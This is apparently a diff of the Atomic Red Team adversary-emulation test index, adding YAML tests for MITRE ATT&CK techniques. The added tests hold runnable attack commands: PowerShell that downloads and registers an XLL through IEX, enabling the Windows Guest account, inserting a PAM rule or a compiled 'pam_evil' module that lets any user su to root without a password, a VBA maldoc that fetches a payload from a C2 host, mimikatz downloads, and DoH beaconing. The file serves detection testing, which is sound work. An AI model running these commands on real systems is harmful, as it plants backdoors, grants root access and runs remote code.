+          default: https://https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.006/bin/HelloWorldXll.xll?raw=true
+        local_file:
+          description: name of the xll file
+          type: path
+          default: "$env:tmp\\HelloWorldXll.xll"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'powershell -c "iwr -URI ''#{xll_url}'' -o ''#{local_file}''; IEX
+          ((new-object -ComObject excel.application).RegisterXLL(''$env:tmp\HelloWorldXll.xll''))"
+
+'
   T1098.001:
     technique:
       external_references:
@@ -39954,6 +41311,23 @@ persistence:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1136.002:
@@ -43488,7 +44862,100 @@ persistence:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1205.001:
     technique:
       external_references:
@@ -59434,6 +60901,89 @@ execution:
         cleanup_command: 'Remove-Item #{pua_file}
 
 '
+    - name: Office Generic Payload Download
+      auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
+      description: |
+        This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
+        Required input agruments are c2_domain and file_name
+        Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+        Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
+        Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
+      supported_platforms:
+      - windows
+      input_arguments:
+        macro_path:
+          description: 'Location of file which will be converted to a VBA macro
+
+'
+          type: Path
+          default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
+        c2_domain:
+          description: 'This required variable points to a user defined HTTP server
+            that will host the file_name in the c2_parent_directory.
+
+'
+          type: url
+          default: "$false"
+        c2_parent_directory:
+          description: |
+            Parent directory where you have the "malicious" file on c2_domain server.
+            Will default to root directory. Forward slashes are not needed at begining or ending of directory path
+          type: Path
+          default: ''
+        file_name:
+          description: |
+            "Malicious" file to be downloaded.
+            This required file needs to be place on the user provided c2 domain
+            Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
+          type: String
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
+        ms_product:
+          description: 'Maldoc application Word or Excel
+
+'
+          type: String
+          default: Word
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Destination c2_domain name or IP address must be set to a running
+          HTTP server.
+
+'
+        prereq_command: 'if (#{c2_domain}) (exit 0) else (exit 1)
+
+'
+        get_prereq_command: 'Write-Host "Destination c2 server domain name or IP address
+          must be set and reachable for HTTP service"
+
+'
+      - description: 'Microsoftt #{ms_product} must be installed
+
+'
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
+
+'
+      executor:
+        name: powershell
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+          $macroCode = Get-Content "#{macro_path}" -Raw
+          $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
+          $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
+          Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
+        cleanup_command: 'Remove-Item "C:\Users\$env:username\Desktop\#{file_name}"
+          -ErrorAction Ignore
+
+'
   T1204.003:
     technique:
       external_references:
@@ -62522,7 +64072,8 @@ lateral-movement:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -62681,7 +64232,8 @@ lateral-movement:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -66285,7 +67837,118 @@ command-and-control:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1572
+    atomic_tests:
+    - name: DNS over HTTPS Large Query Volume
+      auto_generated_guid: ae9ef4b0-d8c1-49d4-8758-06206f19af0a
+      description: |
+        This test simulates an infected host sending a large volume of DoH queries to a command and control server.
+        The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        subdomain:
+          description: Subdomain prepended to the domain name
+          type: string
+          default: atomicredteam
+        query_volume:
+          description: Number of DNS queries to send
+          type: integer
+          default: '1000'
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+      executor:
+        command: 'for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random
+          -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content
+          }
+
+'
+        name: powershell
+    - name: DNS over HTTPS Regular Beaconing
+      auto_generated_guid: 0c5f9705-c575-42a6-9609-cbbff4b2fc9b
+      description: |
+        This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
+        This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        runtime:
+          description: Time in minutes to run the simulation
+          type: integer
+          default: '30'
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+        subdomain:
+          description: Subdomain prepended to the domain name
+          type: string
+          default: atomicredteam
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        c2_interval:
+          description: Seconds between C2 requests to the command and control server
+          type: integer
+          default: '30'
+        c2_jitter:
+          description: Percentage of jitter to add to the C2 interval to create variance
+            in the times between C2 requests
+          type: integer
+          default: '20'
+      executor:
+        command: |
+          Set-Location PathToAtomicsFolder
+          .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
+        name: powershell
+    - name: DNS over HTTPS Long Domain Query
+      auto_generated_guid: 748a73d5-cea4-4f34-84d8-839da5baa99c
+      description: |
+        This test simulates an infected host returning data to a command and control server using long domain names.
+        The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
+         Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        subdomain:
+          description: Subdomain prepended to the domain name (should be 63 characters
+            to test maximum length)
+          type: string
+          default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+      executor:
+        command: |
+          Set-Location PathToAtomicsFolder
+          .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+        name: powershell
   T1090:
     technique:
       created: '2017-05-31T21:31:08.479Z'
@@ -68211,6 +69874,23 @@ initial-access:
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
